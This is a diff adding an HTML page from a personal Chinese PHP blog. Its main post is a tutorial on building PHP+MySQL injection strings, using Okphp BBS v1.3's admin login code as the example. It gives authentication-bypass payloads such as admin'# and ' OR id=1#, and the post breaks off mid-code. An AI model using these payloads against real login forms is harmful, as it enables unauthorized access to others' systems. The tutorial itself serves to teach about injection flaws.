@@ -1,0 +1,258 @@
+<!doctype html>
+<html lang="en">
+	<head>
+		<meta charset="UTF-8">
+		<title>原进榜的博客</title>
+		<link rel="stylesheet" href="./css/bootstrap.css" >
+		<script src="./js/jquery-3.1.1.min.js"></script>
+		<script src="/js/bootstrap.min.js"></script>
+		<style>
+			
+			
+			#title{width:100%; height:200px; background:#ccc;}
+			#ss{font-size:42px; top:60px; position:absolute; left:80px;}
+			.form-group{position:absolute; left:700px; top:80px;}
+			.container{width:100%;}
+			.navbar-nav{margin-left:80px;}
+			.navbar-nav li{margin-left:50px;}
+			.column{margin-left:50px; border:1px solid #ddd;}
+      #cont{background:#ccc;}
+			/*#title{
+				width:100%;
+				height:200px;
+				background:#ccc;
+
+
+			}
+
+			.container{
+				width:100%;
+			}*/
+			#wz{
+				font-size:20px;
+				color:#abc;
+				position:absolute;
+				top:110px;
+				left:80px;
+			
+			}
+
+			
+		</style>
+	</head>
+	<body>
+	
+		<div class="container">
+			<div class="row clearfix">
+				<div id="title">
+					<span id="ss">Benson的博客</span>
+					<span id="wz">http://www.yuanjinbang.cn</span>
+					<form class="navbar-form navbar-left" role="search">
+						<div class="form-group">
+							<input class="form-control" type="text" />
+							<button type="submit" class="btn btn-default">搜索</button>
+						</div>
+					</form>
+				</div>
+			</div>
+		</div>
+
+
+		<div class="container">
+			<div class="row clearfix">
+					<nav class="navbar navbar-default" role="navigation">
+						<div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1" >
+							<ul class="nav navbar-nav">
+								<li class="active">
+									 <a href="./index.html">首页</a>
+								</li>
+								<li>
+									 <a href="./phpbase.html">PHP</a>
+								</li>
+								<li>
+									 <a href="./master.html">日常八卦</a>
+								</li>
+								<li>
+									 <a href="#">杂志</a>
+								</li>
+								<li>
+									 <a href="#">git</a>
+								</li>
+								<li>
+									 <a href="#">工具</a>
+								</li>
+								<li>
+									 <a href="./zt.html">杂谈</a>
+								</li>
+							</ul>
+						</div>
+					</nav>
+			</div>
+			<div class="row clearfix" >
+				<div class="col-md-7 column">
+					<div class="card" id="name1">
+						<h2>谈php+mysql注射语句构造</h2>
+							
+              
+              
+              一.前言：
+　　版本信息：Okphp BBS v1.3 开源版
+　　下载地址：http://www.cncode.com/SoftView.asp?SoftID=1800
+　　由于PHP和MYSQL本身得原因,PHP+MYSQL的注射要比asp困难，尤其是注射时语句的构造方面更是个难点，本文主要是借对Okphp BBS v1.3一些文件得简单分析，来谈谈php+mysql注射语句构造方式，希望本文对你有点帮助。
+　　声明：文章所有提到的“漏洞”，都没有经过测试，可能根本不存在，其实有没有漏洞并不重要，重要的是分析思路和语句构造。
+　　二.“漏洞”分析：
+　　1.admin/login.php注射导致绕过身份验证漏洞：
+　　代码：
+　　$conn=sql_connect($dbhost, $dbuser, $dbpswd, $dbname);
+　　$password = md5($password);
+　　$q = "select id,group_id from $user_table where username='$username' and password='$password'";
+　　$res = sql_query($q,$conn);
+　　$row = sql_fetch_row($res);
+　　$q = "select id,group_id from $user_table where username='$username' and password='$password'"中
+　　$username 和 $password 没过滤， 很容易就绕过。
+　　对于select * from $user_table where username='$username' and password='$password'这样的语句改造的方法有：
+　　构造1(利用逻辑运算)：$username=' OR 'a'='a $password=' OR 'a'='a
+　　相当于sql语句：
+　　select * from $user_table where username='' OR 'a'='a' and password='' OR 'a'='a'
+　　构造2(利用mysql里的注释语句# ，/* 把$password注释掉)：$username=admin'#(或admin'/*)
+　　即：
+　　select * from $user_table where username='admin'#' and password='$password'"
+　　相当于：
+　　select * from $user_table where username='admin'
+　　在admin/login.php中$q语句中的$password在查询前进行了md5加密所以不可以用构造1中的语句绕过。这里我们用构造2：
+　　select id,group_id from $user_table where username='admin'#' and password='$password'"
+　　相当于：
+　　select id,group_id from $user_table where username='admin'
+　　只要存在用户名为admin的就成立，如果不知道用户名，只知道对应的id，
+　　我们就可以这样构造：$username=' OR id=1#
+　　相当于：
+　　select id,group_id from $user_table where username='' OR id=1# and password='$password'(#后的被注释掉)
+　　我们接着往下看代码：
+　　if ($row[0]) {
+　　// If not admin or super moderator
+　　if ($username != "admin" && !eregi("(^|&)3($|&)",$row[1])) {
+　　$login = 0;
+　　}
+　　else {
+　　$login　= 1;
+　　}
+　　}
+　　// Fail to login---------------
+　　if (!$login) {
+　　write_log("Moderator login","0","password wrong");
+              
+              
+
+						</div>
+					</div>
+				</div>
+				<!-- <div class="col-md-4"> 
+
+						dddd
+				</div> -->
+				<div class="col-md-4 column">
+					<h3>博文链接</h3>
+					<ul>
+						<li>
+							<a href="./a.html">面向对象和面向过程的区别</a>
+						</li>
+						<li>
+							<a href="./b.html">PHP的指针引用</a>
+						</li>
+						<!--
+						<li>
+							<a href="./master.html">CCCCCCC</a>
+						</li>
+						<li>
+							<a href="./phpbase.html">DDDDDDDD</a>
+						</li>-->
+					</ul>
+				</div>
+			</div>
+		</div>
+	
+	
+	
+	
+	
+	
+	<!--	<div id="one">
+			<h2>原进榜博客</h2>
+			<input type="text" name="username" value="">
+			<button type="button" class="btn btn-primary">搜索</button>
+			
+		</div>
+		<div class="container">
+			<div class="row clearfix">
+					<nav class="navbar navbar-default" role="navigation">
+						<div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1" >
+							<ul class="nav navbar-nav">
+								<li class="active">
+									 <a href="./index.html">首页</a>
+								</li>
+								<li>
+									 <a href="./phpbase.html">PHP</a>
+								</li>
+								<li>
+									 <a href="./master.html">MySQL</a>
+								</li>
+								<li>
+									 <a href="#">微信开发</a>
+								</li>
+								<li>
+									 <a href="#">git</a>
+								</li>
+								<li>
+									 <a href="#">工具</a>
+								</li>
+								<li>
+									 <a href="./zt.html">杂谈</a>
+								</li>
+							</ul>
+						</div>
+					</nav>
+			</div>
+		
+			<div class="row clearfix">
+				<div class="col-md-7 column">
+					<div class="card">
+						<h1>个人信息</h1>
+						<p>网名：Jonson | 伦哥哥</p>
+						<p>职业：PHP+MySQL+Linux集成开发工程师</p>
+						<p>微信：L470907311</p>
+						<p>Email：470907311@qq.com</p>
+				    </div>
+				</div>
+				<div class="col-md-4 column">
+					<h3>博文链接</h3>
+					<ul>
+						<li>
+							<a href="./gd.html">GD库函数使用</a>
+						</li>
+						<li>
+							<a href="./git.html">如何在github上搭建自己的博客</a>
+						</li>
+						<li>
+							<a href="./master.html">MySQL主从配置</a>
+						</li>
+						<li>
+							<a href="./phpbase.html">echo print print_r var_dump的区别</a>
+						</li>
+					</ul>
+				</div>
+			</div>
+		</div>
+		
+		
+	
+	-->
+		
+		
+		<!--<script>
+			$("#one").click(function(){
+				alert('谈谈谈');
+			});
+		</script>
+		-->
+	</body>
+</html>
